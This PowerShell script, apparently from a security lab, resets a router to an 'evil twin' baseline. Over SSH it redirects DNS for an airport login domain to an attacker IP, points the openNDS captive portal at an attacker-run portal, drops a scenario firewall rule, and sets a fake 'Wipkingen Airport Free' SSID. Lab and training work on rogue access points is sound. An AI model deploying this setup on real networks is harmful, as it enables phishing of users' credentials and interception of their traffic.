<#
.SYNOPSIS
  Returns router B to the plain evil-twin baseline after a scenario:
  DNS points login.airport-wipkingen.com at the attacker, openNDS FAS back to it, the
  S7 firewall rule removed, and the SSID back to Wipkingen Airport Free.
#>
[CmdletBinding()]
param(
  [string]$RouterB = 'mango-b',
  [string]$AttackerIP = '192.168.137.20'
)

$ErrorActionPreference = 'Stop'

function Invoke-B([string]$cmd) {
  Write-Host "B> $cmd" -ForegroundColor DarkGray
  ssh $RouterB $cmd
}

Write-Host '=== Reset router B to baseline ===' -ForegroundColor Green

# DNS: only login.airport-wipkingen.com -> attacker, plus the status.client entry.
Invoke-B (@(
  'while uci -q delete dhcp.@dnsmasq[0].address; do :; done',
  "uci add_list dhcp.@dnsmasq[0].address='/status.client/192.168.247.1'",
  "uci add_list dhcp.@dnsmasq[0].address='/login.airport-wipkingen.com/$AttackerIP'",
  'uci commit dhcp', '/etc/init.d/dnsmasq restart'
) -join '; ')

# openNDS FAS back to the attacker portal.
Invoke-B (@(
  "uci set opennds.@opennds[0].fasremotefqdn='login.airport-wipkingen.com'",
  "uci set opennds.@opennds[0].fasremoteip='$AttackerIP'",
  'uci commit opennds', '/etc/init.d/opennds restart'
) -join '; ')

# Drop the S7 firewall rule if present.
Invoke-B 'uci -q delete firewall.geckoblock; uci commit firewall; /etc/init.d/firewall reload'

# SSID back to Wipkingen Airport Free.
Invoke-B "uci set wireless.wifi2g.ssid='Wipkingen Airport Free'; uci commit wireless; wifi"

Write-Host 'Baseline restored.' -ForegroundColor Green
